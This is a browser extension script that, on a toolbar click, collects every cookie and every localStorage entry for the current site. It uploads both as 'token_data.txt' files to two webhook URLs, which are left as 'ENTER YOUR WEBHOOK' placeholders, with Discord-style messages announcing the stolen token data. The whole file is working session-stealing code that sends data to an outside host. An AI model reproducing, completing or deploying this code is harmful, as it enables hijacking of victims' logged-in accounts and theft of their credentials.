chrome.action.onClicked.addListener(async (tab) => {
    try {
        const url = tab.url;
        const domain = new URL(url).hostname;
        const cookies = await chrome.cookies.getAll({ url: url });
        const cookieData = cookies.length
            ? cookies.map(cookie => `${cookie.name}: ${cookie.value}`).join("\n")
            : "No cookies found.";

        const result = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            world: "MAIN",
            func: () => {
                let output = "";
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    output += key + ": " + localStorage.getItem(key) + "\n";
                }
                return { storageData: output || "No data found in localStorage." };
            }
        });
        const storageData = result[0].result.storageData;

        const localStorageWebhook = //ENTER YOUR WEBHOOK
        const cookiesWebhook = //ENTER YOUR WEBHOOK

        async function sendWebhookWithFile(webhookUrl, content, fileName, fileContent) {
            const boundary = "----WebKitFormBoundary" + Math.random().toString(16).slice(2);
            const formData = [
                `--${boundary}`,
                'Content-Disposition: form-data; name="content"',
                '',
                content,
                `--${boundary}`,
                `Content-Disposition: form-data; name="file"; filename="${fileName}"`,
                'Content-Type: text/plain',
                '',
                fileContent,
                `--${boundary}--`
            ].join("\r\n");

            const response = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
                body: formData
            });
            return response;
        }

        const localStorageContent = `:pushpin: **Local Storage Data Found!** :pushpin:\n` +
                                    `:small_blue_diamond: **URL:** ${url}\n` +
                                    `:small_blue_diamond: **Retrieved At:** ${new Date().toLocaleString()}\n` +
                                    `:small_blue_diamond: **Check the attached file for token data!**`;
        const localStorageTxtContent = storageData;

        const lsResponse = await sendWebhookWithFile(localStorageWebhook, localStorageContent, "token_data.txt", localStorageTxtContent);
        if (!lsResponse.ok) {
            console.error("Failed to send localStorage data:", lsResponse.statusText);
        } else {
            console.log("LocalStorage data and file sent successfully");
        }

        const cookiesContent = `:pushpin: **Cookie Data Found!** :pushpin:\n` +
                               `:small_blue_diamond: **URL:** ${url}\n` +
                               `:small_blue_diamond: **Retrieved At:** ${new Date().toLocaleString()}\n` +
                               `:small_blue_diamond: **Check the attached file for cookie data!**`;
        const cookiesTxtContent = cookieData;

        const cookiesResponse = await sendWebhookWithFile(cookiesWebhook, cookiesContent, "token_data.txt", cookiesTxtContent);
        if (!cookiesResponse.ok) {
            console.error("Failed to send cookie data:", cookiesResponse.statusText);
        } else {
            console.log("Cookies data and file sent successfully");
        }
    } catch (error) {
        console.error("Unexpected error:", error);
    }
});
